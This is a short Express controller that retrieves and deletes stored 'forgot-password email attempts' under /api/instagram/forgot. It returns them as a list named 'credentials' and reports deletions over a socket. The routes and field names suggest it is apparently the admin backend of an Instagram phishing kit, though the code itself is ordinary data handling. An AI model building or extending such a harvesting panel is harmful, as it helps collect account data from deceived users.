const ForgotEmail = require('../models/ForgotEmail.model');
const { getIo }   = require('../config/socket');
const { sendSuccess, sendFailure } = require('../utils/response');

/* ── Format helper — only necessary fields for forgot password ── */
const fmt = (doc) => ({
  id:       doc._id.toString(),
  service:  (doc.source || 'Instagram').toLowerCase(),
  email:    doc.email,
  path:     doc.path || 'forgot_password',
  time:     doc.time || null,
  at:       doc.createdAt ? doc.createdAt.toISOString() : new Date().toISOString(),
  verified: doc.verified ?? false,
});

/**
 * GET /api/instagram/forgot
 * Return all forgot-password email attempts, newest first.
 */
const getAllForgot = async (req, res) => {
  try {
    const docs = await ForgotEmail.find().sort({ createdAt: -1 });
    const credentials = docs.map(fmt);
    return sendSuccess(res, 'Data retrieved', { credentials });
  } catch (err) {
    return sendFailure(res, err.message || 'Internal Server Error', 500);
  }
};

/**
 * DELETE /api/instagram/forgot/all
 * Clear every forgot-password record.
 */
const deleteAllForgot = async (req, res) => {
  try {
    const result = await ForgotEmail.deleteMany({});
    const io = getIo();
    if (io) io.emit('forgotEmailsCleared');
    return sendSuccess(res, `${result.deletedCount} record(s) deleted`);
  } catch (err) {
    return sendFailure(res, err.message || 'Internal Server Error', 500);
  }
};

/**
 * DELETE /api/instagram/forgot/:id
 * Delete a single record.
 */
const deleteForgot = async (req, res) => {
  try {
    const { id } = req.params;
    const doc = await ForgotEmail.findByIdAndDelete(id);
    if (!doc) return sendFailure(res, 'Record not found', 404);
    const io = getIo();
    if (io) io.emit('forgotEmailDeleted', { id });
    return sendSuccess(res, 'Record deleted');
  } catch (err) {
    return sendFailure(res, err.message || 'Internal Server Error', 500);
  }
};

/**
 * DELETE /api/instagram/forgot  (body: { ids: [...] })
 * Bulk delete.
 */
const deleteForgotBulk = async (req, res) => {
  try {
    const { ids } = req.body;
    if (!Array.isArray(ids) || ids.length === 0)
      return sendFailure(res, 'ids array is required', 400);
    await ForgotEmail.deleteMany({ _id: { $in: ids } });
    const io = getIo();
    if (io) io.emit('forgotEmailsDeleted', { ids });
    return sendSuccess(res, `${ids.length} record(s) deleted`);
  } catch (err) {
    return sendFailure(res, err.message || 'Internal Server Error', 500);
  }
};

module.exports = { getAllForgot, deleteAllForgot, deleteForgot, deleteForgotBulk, fmt };
